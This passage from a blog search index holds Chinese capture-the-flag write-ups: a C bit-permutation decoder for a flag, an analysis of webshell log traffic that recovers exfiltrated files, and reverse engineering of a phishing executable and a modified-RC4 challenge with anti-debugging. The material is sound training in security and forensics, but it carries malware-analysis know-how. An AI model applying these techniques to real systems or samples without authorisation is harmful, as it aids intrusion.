class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> box[] = &#123;<span class="number">223</span>, <span class="number">64</span>, <span class="number">650</span>, <span class="number">471</span>, <span class="number">493</span>, <span class="number">580</span>, <span class="number">763</span>, <span class="number">459</span>, <span class="number">754</span>, <span class="number">349</span>, <span class="number">393</span>, <span class="number">417</span>, <span class="number">643</span>, <span class="number">638</span>, <span class="number">208</span>, <span class="number">324</span>, <span class="number">690</span>, <span class="number">490</span>, <span class="number">747</span>, <span class="number">200</span>, <span class="number">505</span>, <span class="number">256</span>, <span class="number">124</span>, <span class="number">670</span>, <span class="number">651</span>, <span class="number">550</span>, <span class="number">392</span>, <span class="number">517</span>, <span class="number">129</span>, <span class="number">526</span>, <span class="number">35</span>, <span class="number">388</span>, <span class="number">183</span>, <span class="number">654</span>, <span class="number">109</span>, <span class="number">318</span>, <span class="number">137</span>, <span class="number">585</span>, <span class="number">492</span>, <span class="number">117</span>, <span class="number">750</span>, <span class="number">507</span>, <span class="number">164</span>, <span class="number">622</span>, <span class="number">101</span>, <span class="number">358</span>, <span class="number">535</span>, <span class="number">661</span>, <span class="number">662</span>, <span class="number">78</span>, <span class="number">41</span>, <span class="number">378</span>, <span class="number">628</span>, <span class="number">410</span>, <span class="number">449</span>, <span class="number">533</span>, <span class="number">593</span>, <span class="number">222</span>, <span class="number">491</span>, <span class="number">38</span>, <span class="number">709</span>, <span class="number">462</span>, <span class="number">83</span>, <span class="number">230</span>, <span class="number">644</span>, <span class="number">627</span>, <span class="number">468</span>, <span class="number">80</span>, <span class="number">724</span>, <span class="number">295</span>, <span class="number">4</span>, <span class="number">435</span>, <span class="number">5</span>, <span class="number">383</span>, <span class="number">444</span>, <span class="number">341</span>, <span class="number">692</span>, <span class="number">411</span>, <span class="number">678</span>, <span class="number">360</span>, <span class="number">679</span>, <span class="number">277</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">688</span>, <span class="number">649</span>, <span class="number">463</span>, <span class="number">337</span>, <span class="number">167</span>, <span class="number">123</span>, <span class="number">142</span>, <span class="number">55</span>, <span class="number">558</span>, <span class="number">397</span>, <span class="number">472</span>, <span class="number">700</span>, <span class="number">683</span>, <span class="number">115</span>, <span class="number">376</span>, <span class="number">728</span>, <span class="number">268</span>, <span class="number">245</span>, <span class="number">689</span>, <span class="number">332</span>, <span class="number">361</span>, <span class="number">731</span>, <span class="number">20</span>, <span class="number">429</span>, <span class="number">619</span>, <span class="number">286</span>, <span class="number">287</span>, <span class="number">641</span>, <span class="number">107</span>, <span class="number">63</span>, <span class="number">209</span>, <span class="number">46</span>, <span class="number">477</span>, <span class="number">74</span>, <span class="number">635</span>, <span class="number">21</span>, <span class="number">529</span>, <span class="number">257</span>, <span class="number">356</span>, <span class="number">723</span>, <span class="number">17</span>, <span class="number">516</span>, <span class="number">671</span>, <span class="number">316</span>, <span class="number">19</span>, <span class="number">419</span>, <span class="number">215</span>, <span class="number">86</span>, <span class="number">749</span>, <span class="number">193</span>, <span class="number">498</span>, <span class="number">118</span>, <span class="number">740</span>, <span class="number">347</span>, <span class="number">217</span>, <span class="number">292</span>, <span class="number">655</span>, <span class="number">482</span>, <span class="number">695</span>, <span class="number">501</span>, <span class="number">431</span>, <span class="number">368</span>, <span class="number">401</span>, <span class="number">424</span>, <span class="number">713</span>, <span class="number">466</span>, <span class="number">82</span>, <span class="number">25</span>, <span class="number">264</span>, <span class="number">598</span>, <span class="number">161</span>, <span class="number">694</span>, <span class="number">147</span>, <span class="number">340</span>, <span class="number">283</span>, <span class="number">185</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">736</span>, <span class="number">297</span>, <span class="number">733</span>, <span class="number">766</span>, <span class="number">56</span>, <span class="number">367</span>, <span class="number">592</span>, <span class="number">510</span>, <span class="number">422</span>, <span class="number">568</span>, <span class="number">571</span>, <span class="number">666</span>, <span class="number">602</span>, <span class="number">727</span>, <span class="number">645</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">203</span>, <span class="number">110</span>, <span class="number">584</span>, <span class="number">436</span>, <span class="number">575</span>, <span class="number">155</span>, <span class="number">192</span>, <span class="number">518</span>, <span class="number">597</span>, <span class="number">335</span>, <span class="number">454</span>, <span class="number">450</span>, <span class="number">37</span>, <span class="number">583</span>, <span class="number">158</span>, <span class="number">664</span>, <span class="number">399</span>, <span class="number">165</span>, <span class="number">307</span>, <span class="number">76</span>, <span class="number">537</span>, <span class="number">114</span>, <span class="number">624</span>, <span class="number">170</span>, <span class="number">206</span>, <span class="number">687</span>, <span class="number">169</span>, <span class="number">385</span>, <span class="number">483</span>, <span class="number">703</span>, <span class="number">681</span>, <span class="number">426</span>, <span class="number">730</span>, <span class="number">120</span>, <span class="number">456</span>, <span class="number">621</span>, <span class="number">36</span>, <span class="number">272</span>, <span class="number">717</span>, <span class="number">357</span>, <span class="number">718</span>, <span class="number">22</span>, <span class="number">54</span>, <span class="number">255</span>, <span class="number">497</span>, <span class="number">274</span>, <span class="number">59</span>, <span class="number">536</span>, <span class="number">320</span>, <span class="number">726</span>, <span class="number">389</span>, <span class="number">514</span>, <span class="number">339</span>, <span class="number">460</span>, <span class="number">108</span>, <span class="number">534</span>, <span class="number">660</span>, <span class="number">69</span>, <span class="number">190</span>, <span class="number">626</span>, <span class="number">379</span>, <span class="number">140</span>, <span class="number">181</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">288</span>, <span class="number">448</span>, <span class="number">77</span>, <span class="number">24</span>, <span class="number">39</span>, <span class="number">113</span>, <span class="number">187</span>, <span class="number">322</span>, <span class="number">216</span>, <span class="number">734</span>, <span class="number">42</span>, <span class="number">104</span>, <span class="number">153</span>, <span class="number">278</span>, <span class="number">433</span>, <span class="number">353</span>, <span class="number">373</span>, <span class="number">636</span>, <span class="number">502</span>, <span class="number">423</span>, <span class="number">374</span>, <span class="number">317</span>, <span class="number">87</span>, <span class="number">567</span>, <span class="number">485</span>, <span class="number">72</span>, <span class="number">540</span>, <span class="number">415</span>, <span class="number">443</span>, <span class="number">1</span>, <span class="number">605</span>, <span class="number">201</span>, <span class="number">407</span>, <span class="number">427</span>, <span class="number">390</span>, <span class="number">210</span>, <span class="number">179</span>, <span class="number">314</span>, <span class="number">188</span>, <span class="number">425</span>, <span class="number">156</span>, <span class="number">486</span>, <span class="number">746</span>, <span class="number">244</span>, <span class="number">476</span>, <span class="number">219</span>, <span class="number">710</span>, <span class="number">211</span>, <span class="number">488</span>, <span class="number">499</span>, <span class="number">149</span>, <span class="number">202</span>, <span class="number">523</span>, <span class="number">2</span>, <span class="number">696</span>, <span class="number">414</span>, <span class="number">442</span>, <span class="number">184</span>, <span class="number">737</span>, <span class="number">432</span>, <span class="number">196</span>, <span class="number">338</span>, <span class="number">565</span>, <span class="number">520</span>, <span class="number">711</span>, <span class="number">595</span>, <span class="number">398</span>, <span class="number">359</span>, <span class="number">364</span>, <span class="number">102</span>, <span class="number">406</span>, <span class="number">45</span>, <span class="number">65</span>, <span class="number">685</span>, <span class="number">73</span>, <span class="number">509</span>, <span class="number">637</span>, <span class="number">365</span>, <span class="number">313</span>, <span class="number">235</span>, <span class="number">296</span>, <span class="number">721</span>, <span class="number">134</span>, <span class="number">569</span>, <span class="number">128</span>, <span class="number">416</span>, <span class="number">760</span>, <span class="number">126</span>, <span class="number">98</span>, <span class="number">263</span>, <span class="number">51</span>, <span class="number">599</span>, <span class="number">452</span>, <span class="number">693</span>, <span class="number">348</span>, <span class="number">508</span>, <span class="number">241</span>, <span class="number">34</span>, <span class="number">362</span>, <span class="number">145</span>, <span class="number">538</span>, <span class="number">180</span>, <span class="number">659</span>, <span class="number">458</span>, <span class="number">47</span>, <span class="number">676</span>, <span class="number">352</span>, <span class="number">218</span>, <span class="number">282</span>, <span class="number">566</span>, <span class="number">79</span>, <span class="number">309</span>, <span class="number">639</span>, <span class="number">386</span>, <span class="number">127</span>, <span class="number">12</span>, <span class="number">27</span>, <span class="number">609</span>, <span class="number">603</span>, <span class="number">663</span>, <span class="number">163</span>, <span class="number">691</span>, <span class="number">233</span>, <span class="number">294</span>, <span class="number">586</span>, <span class="number">207</span>, <span class="number">581</span>, <span class="number">139</span>, <span class="number">741</span>, <span class="number">589</span>, <span class="number">494</span>, <span class="number">512</span>, <span class="number">159</span>, <span class="number">612</span>, <span class="number">402</span>, <span class="number">682</span>, <span class="number">441</span>, <span class="number">577</span>, <span class="number">739</span>, <span class="number">310</span>, <span class="number">10</span>, <span class="number">531</span>, <span class="number">591</span>, <span class="number">464</span>, <span class="number">674</span>, <span class="number">116</span>, <span class="number">665</span>, <span class="number">75</span>, <span class="number">608</span>, <span class="number">157</span>, <span class="number">267</span>, <span class="number">743</span>, <span class="number">412</span>, <span class="number">269</span>, <span class="number">298</span>, <span class="number">675</span>, <span class="number">729</span>, <span class="number">105</span>, <span class="number">265</span>, <span class="number">720</span>, <span class="number">371</span>, <span class="number">579</span>, <span class="number">545</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">553</span>, <span class="number">576</span>, <span class="number">121</span>, <span class="number">377</span>, <span class="number">32</span>, <span class="number">631</span>, <span class="number">504</span>, <span class="number">52</span>, <span class="number">705</span>, <span class="number">154</span>, <span class="number">606</span>, <span class="number">604</span>, <span class="number">408</span>, <span class="number">753</span>, <span class="number">594</span>, <span class="number">224</span>, <span class="number">252</span>, <span class="number">279</span>, <span class="number">434</span>, <span class="number">745</span>, <span class="number">582</span>, <span class="number">440</span>, <span class="number">150</span>, <span class="number">258</span>, <span class="number">351</span>, <span class="number">614</span>, <span class="number">647</span>, <span class="number">33</span>, <span class="number">646</span>, <span class="number">94</span>, <span class="number">561</span>, <span class="number">611</span>, <span class="number">62</span>, <span class="number">765</span>, <span class="number">198</span>, <span class="number">618</span>, <span class="number">633</span>, <span class="number">273</span>, <span class="number">400</span>, <span class="number">58</span>, <span class="number">302</span>, <span class="number">735</span>, <span class="number">457</span>, <span class="number">455</span>, <span class="number">290</span>, <span class="number">319</span>, <span class="number">451</span>, <span class="number">85</span>, <span class="number">204</span>, <span class="number">31</span>, <span class="number">308</span>, <span class="number">413</span>, <span class="number">89</span>, <span class="number">744</span>, <span class="number">11</span>, <span class="number">613</span>, <span class="number">698</span>, <span class="number">166</span>, <span class="number">229</span>, <span class="number">23</span>, <span class="number">350</span>, <span class="number">742</span>, <span class="number">640</span>, <span class="number">330</span>, <span class="number">336</span>, <span class="number">546</span>, <span class="number">122</span>, <span class="number">395</span>, <span class="number">652</span>, <span class="number">541</span>, <span class="number">634</span>, <span class="number">667</span>, <span class="number">372</span>, <span class="number">119</span>, <span class="number">311</span>, <span class="number">475</span>, <span class="number">758</span>, <span class="number">238</span>, <span class="number">447</span>, <span class="number">151</span>, <span class="number">532</span>, <span class="number">714</span>, <span class="number">304</span>, <span class="number">552</span>, <span class="number">418</span>, <span class="number">405</span>, <span class="number">106</span>, <span class="number">93</span>, <span class="number">600</span>, <span class="number">625</span>, <span class="number">18</span>, <span class="number">465</span>, <span class="number">276</span>, <span class="number">680</span>, <span class="number">409</span>, <span class="number">321</span>, <span class="number">446</span>, <span class="number">289</span>, <span class="number">195</span>, <span class="number">630</span>, <span class="number">213</span>, <span class="number">403</span>, <span class="number">53</span>, <span class="number">615</span>, <span class="number">40</span>, <span class="number">363</span>, <span class="number">716</span>, <span class="number">91</span>, <span class="number">381</span>, <span class="number">587</span>, <span class="number">135</span>, <span class="number">617</span>, <span class="number">461</span>, <span class="number">176</span>, <span class="number">271</span>, <span class="number">521</span>, <span class="number">547</span>, <span class="number">60</span>, <span class="number">543</span>, <span class="number">554</span>, <span class="number">327</span>, <span class="number">588</span>, <span class="number">559</span>, <span class="number">66</span>, <span class="number">160</span>, <span class="number">556</span>, <span class="number">328</span>, <span class="number">764</span>, <span class="number">601</span>, <span class="number">92</span>, <span class="number">16</span>, <span class="number">334</span>, <span class="number">236</span>, <span class="number">668</span>, <span class="number">738</span>, <span class="number">186</span>, <span class="number">684</span>, <span class="number">346</span>, <span class="number">141</span>, <span class="number">610</span>, <span class="number">205</span>, <span class="number">515</span>, <span class="number">130</span>, <span class="number">500</span>, <span class="number">467</span>, <span class="number">762</span>, <span class="number">428</span>, <span class="number">303</span>, <span class="number">239</span>, <span class="number">177</span>, <span class="number">748</span>, <span class="number">511</span>, <span class="number">525</span>, <span class="number">88</span>, <span class="number">453</span>, <span class="number">266</span>, <span class="number">572</span>, <span class="number">752</span>, <span class="number">391</span>, <span class="number">542</span>, <span class="number">248</span>, <span class="number">246</span>, <span class="number">138</span>, <span class="number">473</span>, <span class="number">48</span>, <span class="number">524</span>, <span class="number">281</span>, <span class="number">212</span>, <span class="number">522</span>, <span class="number">481</span>, <span class="number">323</span>, <span class="number">496</span>, <span class="number">420</span>, <span class="number">574</span>, <span class="number">437</span>, <span class="number">232</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">469</span>, <span class="number">387</span>, <span class="number">722</span>, <span class="number">143</span>, <span class="number">767</span>, <span class="number">148</span>, <span class="number">280</span>, <span class="number">285</span>, <span class="number">90</span>, <span class="number">344</span>, <span class="number">234</span>, <span class="number">8</span>, <span class="number">227</span>, <span class="number">270</span>, <span class="number">291</span>, <span class="number">513</span>, <span class="number">312</span>, <span class="number">657</span>, <span class="number">61</span>, <span class="number">260</span>, <span class="number">607</span>, <span class="number">751</span>, <span class="number">301</span>, <span class="number">152</span>, <span class="number">275</span>, <span class="number">480</span>, <span class="number">214</span>, <span class="number">259</span>, <span class="number">243</span>, <span class="number">326</span>, <span class="number">573</span>, <span class="number">375</span>, <span class="number">226</span>, <span class="number">704</span>, <span class="number">563</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">7</span>, <span class="number">250</span>, <span class="number">366</span>, <span class="number">225</span>, <span class="number">725</span>, <span class="number">146</span>, <span class="number">487</span>, <span class="number">251</span>, <span class="number">396</span>, <span class="number">699</span>, <span class="number">590</span>, <span class="number">686</span>, <span class="number">305</span>, <span class="number">342</span>, <span class="number">578</span>, <span class="number">333</span>, <span class="number">706</span>, <span class="number">528</span>, <span class="number">237</span>, <span class="number">656</span>, <span class="number">197</span>, <span class="number">380</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">439</span>, <span class="number">174</span>, <span class="number">489</span>, <span class="number">249</span>, <span class="number">300</span>, <span class="number">343</span>, <span class="number">345</span>, <span class="number">549</span>, <span class="number">293</span>, <span class="number">220</span>, <span class="number">506</span>, <span class="number">474</span>, <span class="number">261</span>, <span class="number">299</span>, <span class="number">173</span>, <span class="number">478</span>, <span class="number">394</span>, <span class="number">759</span>, <span class="number">620</span>, <span class="number">484</span>, <span class="number">404</span>, <span class="number">562</span>, <span class="number">96</span>, <span class="number">369</span>, <span class="number">555</span>, <span class="number">194</span>, <span class="number">708</span>, <span class="number">438</span>, <span class="number">26</span>, <span class="number">702</span>, <span class="number">642</span>, <span class="number">658</span>, <span class="number">672</span>, <span class="number">519</span>, <span class="number">50</span>, <span class="number">125</span>, <span class="number">43</span>, <span class="number">331</span>, <span class="number">470</span>, <span class="number">719</span>, <span class="number">44</span>, <span class="number">551</span>, <span class="number">673</span>, <span class="number">182</span>, <span class="number">370</span>, <span class="number">421</span>, <span class="number">355</span>, <span class="number">570</span>, <span class="number">132</span>, <span class="number">354</span>, <span class="number">231</span>, <span class="number">495</span>, <span class="number">262</span>, <span class="number">648</span>, <span class="number">172</span>, <span class="number">629</span>, <span class="number">168</span>, <span class="number">6</span>, <span class="number">564</span>, <span class="number">136</span>, <span class="number">30</span>, <span class="number">382</span>, <span class="number">171</span>, <span class="number">653</span>, <span class="number">761</span>, <span class="number">755</span>, <span class="number">162</span>, <span class="number">315</span>, <span class="number">732</span>, <span class="number">325</span>, <span class="number">189</span>, <span class="number">669</span>, <span class="number">253</span>, <span class="number">596</span>, <span class="number">697</span>, <span class="number">67</span>, <span class="number">306</span>, <span class="number">144</span>, <span class="number">503</span>, <span class="number">29</span>, <span class="number">178</span>, <span class="number">677</span>, <span class="number">103</span>, <span class="number">707</span>, <span class="number">548</span>, <span class="number">701</span>, <span class="number">112</span>, <span class="number">191</span>, <span class="number">530</span>, <span class="number">242</span>, <span class="number">756</span>, <span class="number">479</span>, <span class="number">616</span>, <span class="number">632</span>, <span class="number">430</span>, <span class="number">539</span>, <span class="number">527</span>, <span class="number">221</span>, <span class="number">15</span>, <span class="number">329</span>, <span class="number">175</span>, <span class="number">445</span>, <span class="number">623</span>, <span class="number">14</span>, <span class="number">560</span>, <span class="number">247</span>, <span class="number">97</span>, <span class="number">544</span>, <span class="number">284</span>, <span class="number">133</span>, <span class="number">228</span>, <span class="number">68</span>, <span class="number">757</span>, <span class="number">71</span>, <span class="number">712</span>, <span class="number">95</span>, <span class="number">557</span>, <span class="number">715</span>, <span class="number">384</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dwBitNum = len * <span class="number">8</span>;</span><br><span class="line">  BitDecode(cipher, box, dwBitNum);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> flag[] = &#123;</span><br><span class="line"><span class="number">0x0C</span>,<span class="number">0x61</span>,<span class="number">0x48</span>,<span class="number">0x3A</span>,<span class="number">0x01</span>,<span class="number">0x44</span>,<span class="number">0xD2</span>,<span class="number">0x8D</span>,<span class="number">0xCA</span>,<span class="number">0x0B</span>,<span class="number">0xB8</span>,<span class="number">0x02</span>,<span class="number">0xB1</span>,<span class="number">0xC5</span>,<span class="number">0x88</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x67</span>,<span class="number">0x69</span>,<span class="number">0x26</span>,<span class="number">0x69</span>,<span class="number">0x11</span>,<span class="number">0xC7</span>,<span class="number">0x47</span>,<span class="number">0x1F</span>,<span class="number">0xDC</span>,<span class="number">0xB7</span>,<span class="number">0x0E</span>,<span class="number">0x1A</span>,<span class="number">0x50</span>,<span class="number">0xC3</span>,<span class="number">0x57</span>,<span class="number">0x0D</span>,</span><br><span class="line"><span class="number">0x75</span>,<span class="number">0xAF</span>,<span class="number">0x01</span>,<span class="number">0x58</span>,<span class="number">0x14</span>,<span class="number">0xA2</span>,<span class="number">0x0A</span>,<span class="number">0xFF</span>,<span class="number">0xC8</span>,<span class="number">0x8C</span>,<span class="number">0x05</span>,<span class="number">0xD9</span>,<span class="number">0x40</span>,<span class="number">0xF6</span>,<span class="number">0xA3</span>,<span class="number">0x16</span>,</span><br><span class="line"><span class="number">0x21</span>,<span class="number">0x5B</span>,<span class="number">0x3D</span>,<span class="number">0xFF</span>,<span class="number">0x59</span>,<span class="number">0xC2</span>,<span class="number">0xFB</span>,<span class="number">0x54</span>,<span class="number">0x83</span>,<span class="number">0x81</span>,<span class="number">0xB4</span>,<span class="number">0x8E</span>,<span class="number">0x6A</span>,<span class="number">0x50</span>,<span class="number">0x1C</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xA5</span>,<span class="number">0xB8</span>,<span class="number">0xE4</span>,<span class="number">0x4D</span>,<span class="number">0x41</span>,<span class="number">0xA3</span>,<span class="number">0x12</span>,<span class="number">0x00</span>,<span class="number">0xF0</span>,<span class="number">0xC8</span>,<span class="number">0x0A</span>,<span class="number">0x96</span>,<span class="number">0xAA</span>,<span class="number">0x79</span>,<span class="number">0x48</span>,<span class="number">0xF1</span>,</span><br><span class="line"><span class="number">0x5B</span>,<span class="number">0x24</span>,<span class="number">0xD0</span>,<span class="number">0x9D</span>,<span class="number">0x75</span>,<span class="number">0xB7</span>,<span class="number">0xA8</span>,<span class="number">0xDA</span>,<span class="number">0x86</span>,<span class="number">0x44</span>,<span class="number">0x37</span>,<span class="number">0x0B</span>,<span class="number">0xB0</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,<span class="number">0x4C</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flag_length = <span class="number">96</span>;</span><br><span class="line">  BitDanceDecode(flag, flag_length);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h2><h3 id="easydatalog"><a href="#easydatalog" class="headerlink" title="easydatalog"></a>easydatalog</h3><p>给了两个日志文件</p><p><code>access.log</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124231109050.png" alt="image-20250124231108965"></p><p><code>error.log</code></p><p>在其中发现了几段相似的<code>base64</code>，根据php代码可以知道，变量<code>b1709fecc8bc5e</code>去掉前两位之后开始进行<code>base64</code>解码</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124231441776.png" alt="image-20250124231441654"></p><p>在日志中可以发现上传了图片<code>password.jpg</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124232930382.png" alt="image-20250124232928217"></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124232850263.png" alt="image-20250124232823313"></p><p>同样，后面还有一个<code>data.zip</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124233055053.png" alt="image-20250124233052009"></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124233306970.png" alt="image-20250124233303768"></p><p>利用<code>winhex</code>将数据导出为对应文件</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250124233538038.png" alt="image-20250124233534027"></p><p>压缩包中有一个<code>data.csv</code>文件，解压需要密码 </p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250125000407630.png" alt="image-20250124233633576"></p><p>图片盲水印提取到解压密码<code>dataPersonPass123987</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250125001638187.png" alt="image-20250125001634913"></p><p>解压后成功得到答案</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250125001806680.png" alt="image-20250125001801929"></p>]]></content>
      
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第18届全国大学生软件创新大赛-软件系统安全攻防赛</title>
      <link href="/2025/01/08/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B/"/>
      <url>/2025/01/08/%E7%AC%AC18%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h2><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023621311.png" alt="image-20250108104959509"></p><p>给了一个<code>.eml</code>文件，outlook打开，有一个<code>生日快乐.zip</code>，解压需要密码，根据发件日期，24岁等信息，可以猜测出解压密码即为生日<code>20001111</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023631569.png" alt="image-20250108105825686"></p><p>解压后得到<code>生日快乐.exe</code>，双击运行，wirshark抓包，找到<code>ip</code>和<code>port</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023644163.png" alt="image-20250108112125065"></p><p>md5结果</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023650933.png" alt="image-20250108105733328"></p><hr><h2 id="donntyousee"><a href="#donntyousee" class="headerlink" title="donntyousee"></a>donntyousee</h2><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023709355.png" alt="image-20250108111407864"></p><p>查看函数<code>sub_405559()</code><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023702714.png" alt="image-2025010523513"></p><p>存在花指令</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023721090.png" alt="image-20250105235332137"></p><p>将<code>ret</code>nop掉<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023728682.png" alt="image-20250105235413571"></p><p>动调跑一下，这里一定要在函数<code>sub_405559()</code>里面下断，不然单步会直接跳过该函数，直接跟丢了<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023744332.png" alt="image-20250106084309582"></p><p>多次尝试发现这个<code>call</code>是进行输入的地方，这里直接进行输入然后步过<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023750404.png" alt="image-20250106084149036"></p><p>这两个call步入<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023802044.png" alt="image-20250106084612297"></p><p>第一个<code>call</code>，发现是rc4初始化<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023814028.png" alt="image-20250106084742808"></p><p>第二个<code>call</code>是魔改的RC4，最后加了个亦或<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023927912.png" alt="image-20250106085025637"></p><p>跟一下加密后的结果，找到存储密文的地址<code>unk_5C6CC0</code><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023917712.png" alt="image-20250106085636258"></p><p>然后去看密文在哪里进行<code>check</code>，这里交叉引用</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023907984.png" alt="image-20250106090636357"></p><p>定位到函数<code>sub_4054FB</code>，这个call步入<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023900502.png" alt="image-20250106090845227"></p><p>发现密文<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023848222.png" alt="image-20250106091036465"></p><p>秘钥key</p><blockquote><p>这里做了反调试，导致key动态和静态的值不一样</p></blockquote><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023836171.png" alt="image-20250106090243481"></p><p>将密文和<code>key</code>dump出来，用工具解密即可<img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250122023828090.png" alt="image-20250106091124095"></p>]]></content>
      
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
